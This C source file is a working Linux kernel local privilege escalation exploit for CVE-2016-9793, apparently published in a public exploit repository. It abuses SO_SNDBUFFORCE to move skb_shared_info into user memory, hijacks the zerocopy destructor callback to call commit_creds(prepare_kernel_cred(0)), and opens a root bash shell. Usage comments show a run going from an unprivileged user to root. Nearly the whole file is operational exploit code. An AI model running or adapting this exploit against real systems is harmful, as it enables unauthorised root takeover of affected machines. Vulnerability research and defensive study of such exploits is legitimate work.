// CAP_NET_ADMIN -> root LPE exploit for CVE-2016-9793
// No KASLR, SMEP or SMAP bypass included
// Affected kernels: 3.11 -> 4.8
// Tested in QEMU only
// https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
//
// Usage:
// # gcc -pthread exploit.c -o exploit
// # chown guest:guest exploit
// # setcap cap_net_admin+ep ./exploit
// # su guest
// $ whoami
// guest
// $ ./exploit
// [.] userspace payload mmapped at 0xfffff000
// [.] overwriting thread started
// [.] sockets opened
// [.] sock->sk_sndbuf set to fffffe00
// [.] writing to socket
// [+] got r00t
// # whoami
// root
//
// Andrey Konovalov <andreyknvl@gmail.com>

#define _GNU_SOURCE

#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>

#include <pthread.h>
#include <signal.h>
#include <stdarg.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define COMMIT_CREDS 0xffffffff81079860ul
#define PREPARE_KERNEL_CRED 0xffffffff81079b20ul

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;

void get_root(void) {
 	commit_creds(prepare_kernel_cred(0));
}

struct ubuf_info_t {
  uint64_t callback;        // void (*callback)(struct ubuf_info *, bool)
  uint64_t ctx;             // void *
  uint64_t desc;            // unsigned long
};

struct skb_shared_info_t {
  uint8_t  nr_frags;        // unsigned char
  uint8_t  tx_flags;        // __u8
  uint16_t gso_size;        // unsigned short
  uint16_t gso_segs;        // unsigned short
  uint16_t gso_type;        // unsigned short
  uint64_t frag_list;       // struct sk_buff *
  uint64_t hwtstamps;       // struct skb_shared_hwtstamps
  uint32_t tskey;           // u32
  uint32_t ip6_frag_id;     // __be32
  uint32_t dataref;         // atomic_t
  uint64_t destructor_arg;  // void *
  uint8_t  frags[16][17];   // skb_frag_t frags[MAX_SKB_FRAGS];
};

// sk_sndbuf = 0xffffff00 => skb_shinfo(skb) = 0x00000000fffffed0
#define SNDBUF 0xffffff00
#define SHINFO 0x00000000fffffed0ul

struct ubuf_info_t ubuf_info = {(uint64_t)&get_root, 0, 0};
//struct ubuf_info_t ubuf_info = {0xffffdeaddeadbeeful, 0, 0};
struct skb_shared_info_t *skb_shared_info = (struct skb_shared_info_t *)SHINFO;

#define SKBTX_DEV_ZEROCOPY (1 << 3)

void* skb_thr(void* arg) {
	while (1) {
		skb_shared_info->destructor_arg = (uint64_t)&ubuf_info;
		skb_shared_info->tx_flags |= SKBTX_DEV_ZEROCOPY;
	}
}

int sockets[2];

void *write_thr(void *arg) {
	// Write blocks until setsockopt(SO_SNDBUF).
	write(sockets[1], "\x5c", 1);

	if (getuid() == 0) {
		printf("[+] got r00t\n");
		execl("/bin/bash", "bash", NULL);
		perror("execl()");
	}
	printf("[-] something went wrong\n");
}

int main() {
	void *addr;
	int rv;
	uint32_t sndbuf;

	addr = mmap((void *)(SHINFO & 0xfffffffffffff000ul), 0x1000ul,
		PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE,
		-1, 0);
	if (addr != (void *)(SHINFO & 0xfffffffffffff000ul)) {
		perror("mmap()");
		exit(EXIT_FAILURE);
	}

	printf("[.] userspace payload mmapped at %p\n", addr);

 	pthread_t skb_th;
    	rv = pthread_create(&skb_th, 0, skb_thr, NULL);
	if (rv != 0) {
		perror("pthread_create()");
		exit(EXIT_FAILURE);
	}
    	usleep(10000);

	printf("[.] overwriting thread started\n");

	rv = socketpair(AF_LOCAL, SOCK_STREAM, 0, &sockets[0]);
	if (rv != 0) {
		perror("socketpair()");
		exit(EXIT_FAILURE);
	}

	printf("[.] sockets opened\n");

	sndbuf = SNDBUF;
	rv = setsockopt(sockets[1], SOL_SOCKET, SO_SNDBUFFORCE,
			&sndbuf, sizeof(sndbuf));
	if (rv != 0) {
		perror("setsockopt()");
		exit(EXIT_FAILURE);
	}

	printf("[.] sock->sk_sndbuf set to %x\n", SNDBUF * 2);

	pthread_t write_th;
	rv = pthread_create(&write_th, 0, write_thr, NULL);
	if (rv != 0) {
		perror("pthread_create()");
		exit(EXIT_FAILURE);
	}
	usleep(10000);

	printf("[.] writing to socket\n");

	// Wake up blocked write.
	rv = setsockopt(sockets[1], SOL_SOCKET, SO_SNDBUF,
			&sndbuf, sizeof(sndbuf));
	if (rv != 0) {
		perror("setsockopt()");
		exit(EXIT_FAILURE);
	}
	usleep(10000);

	close(sockets[0]);
	close(sockets[1]);

	return 0;
}